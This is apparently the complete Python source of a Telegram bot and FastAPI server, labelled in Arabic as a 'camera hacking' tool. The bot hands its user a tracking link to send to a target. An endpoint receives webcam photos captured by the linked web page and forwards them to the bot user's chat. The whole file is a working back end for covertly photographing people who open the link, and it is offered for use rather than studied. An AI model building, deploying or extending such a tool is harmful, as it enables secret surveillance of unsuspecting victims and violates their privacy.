import os, base64, asyncio
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, BufferedInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.client.default import DefaultBotProperties

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# 1. رسالة الترحيب مع زر الاختراق
@dp.message(F.text == "/start")
async def start(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💀 اختراق الكاميرا", callback_data="get_link")]
    ])
    await msg.answer("مرحباً بك في البوت الاحترافي.\nاختر من القائمة:", reply_markup=kb)

# 2. عند الضغط على الزر، يرسل الرابط فقط
@dp.callback_query(F.data == "get_link")
async def send_link(cb: CallbackQuery):
    user_id = cb.from_user.id
    link = f"{PUBLIC_URL}/?chatId={user_id}"
    await cb.message.answer(link, disable_web_page_preview=True)
    await cb.answer()

@asynccontextmanager
async def lifespan(app: FastAPI):
    polling = asyncio.create_task(dp.start_polling(bot))
    yield
    polling.cancel()
    await bot.session.close()

app = FastAPI(lifespan=lifespan)

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("webapp/index.html", "r", encoding="utf-8") as f:
        return f.read()

class PhotoPayload(BaseModel):
    chat_id: str
    image_b64: str

@app.post("/api/photo")
async def receive_photo(p: PhotoPayload):
    if not p.image_b64.startswith("data:image/"):
        raise HTTPException(400, "Invalid image")
    
    _, b64 = p.image_b64.split(",", 1)
    raw = base64.b64decode(b64)
    
    try:
        await bot.send_photo(
            chat_id=p.chat_id,
            photo=BufferedInputFile(raw, filename="capture.jpg"),
            caption="📸 تم التقاط الصورة."
        )
    except Exception as e:
        raise HTTPException(500, str(e))
        
    return {"ok": True}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
